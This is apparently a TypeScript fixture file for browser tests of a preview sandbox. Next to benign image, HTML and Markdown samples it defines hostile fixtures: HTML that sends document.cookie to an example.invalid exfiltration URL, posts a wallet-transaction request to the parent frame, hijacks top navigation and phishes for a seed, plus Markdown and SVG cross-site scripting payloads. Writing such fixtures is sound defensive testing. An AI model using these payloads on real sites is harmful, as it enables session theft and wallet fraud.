// Deterministic fixture bytes for the demo adapter and the browser tests.
// Benign files exercise retained multi-asset history; malicious ones exercise preview isolation.

export const PNG_GREEN_B64 =
  "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAHklEQVR42mP48vEFSYhhkGuQz4/BikY10FfDEE1LADRPVF9Un0lrAAAAAElFTkSuQmCC";
export const PNG_AMBER_B64 =
  "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAHklEQVR42mP48vEFSYhhkGs45MiDFY1qoK+GIZqWAJvhXZ/x80uAAAAAAElFTkSuQmCC";

export const HTML_R1 = `<!doctype html>
<html lang="en-US"><head><meta charset="utf-8"><title>Introducing CTO Relay</title>
<style>body{font-family:sans-serif;margin:2rem;color:#1b2a24}h1{font-size:1.6rem}</style></head>
<body><!-- marker:R1 --><h1>Introducing CTO Relay</h1><p>A public introduction built in round one.</p></body></html>
`;

export const htmlR3 = (imageB64: string) => `<!doctype html>
<html lang="en-US"><head><meta charset="utf-8"><title>Introducing CTO Relay</title>
<style>body{font-family:sans-serif;margin:2rem;color:#1b2a24}h1{font-size:1.6rem}img{width:64px;height:64px;image-rendering:pixelated}</style></head>
<body><!-- marker:R1 --><!-- marker:R3 --><h1>Introducing CTO Relay</h1><p>A public introduction built in round one.</p>
<p>Round three includes the cover from round two: </p><img alt="Cover from round two" src="data:image/png;base64,${imageB64}"></body></html>
`;

export const DOC_NOTES = `# Project notes

These Markdown notes are deterministic demo content.

- Each branch has its own IMD project
- Files retain their origins across rounds
`;

export const EVIL_HTML = `<!doctype html><html><head><meta charset="utf-8"><title>Hostile page fixture</title>
<meta http-equiv="refresh" content="0;url=https://example.invalid/phish">
<style>@import "https://example.invalid/css";body{background-image:url("https://example.invalid/tracker-css")}</style>
<script>
  try { parent.postMessage({ method: "eth_sendTransaction", params: [{ to: "0x0", value: "0x1" }] }, "*"); } catch (e) {}
  try { window.top.location = "https://example.invalid/top"; } catch (e) {}
  try { fetch("https://example.invalid/exfil?c=" + document.cookie); } catch (e) {}
  try { localStorage.setItem("w1.pwned", "1"); } catch (e) {}
  try { window.open("https://example.invalid/popup"); } catch (e) {}
  document.title = "SCRIPT_RAN";
</script></head>
<body><h1 id="evil">Hostile HTML fixture</h1>
<form action="https://example.invalid/steal"><input name="seed" value="x"><button>Submit</button></form>
<a href="javascript:alert(1)" target="_top">Top navigation attempt</a>
<img src="https://example.invalid/tracker.png" alt="Remote tracking pixel">
</body></html>
`;

export const EVIL_MD = `# Hostile Markdown fixture

<script>window.__mdScriptRan = true</script>

<img src="x" onerror="window.__mdOnerror = true">

[Unsafe link](javascript:alert(1))

<iframe src="https://example.invalid"></iframe>

[Safe HTTPS link](https://example.org/docs)

<a id="main" name="ethereum" tabindex="1" autofocus>Cannot override host identifiers or focus</a>
`;

export const SVG_AS_PNG = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script></svg>`;
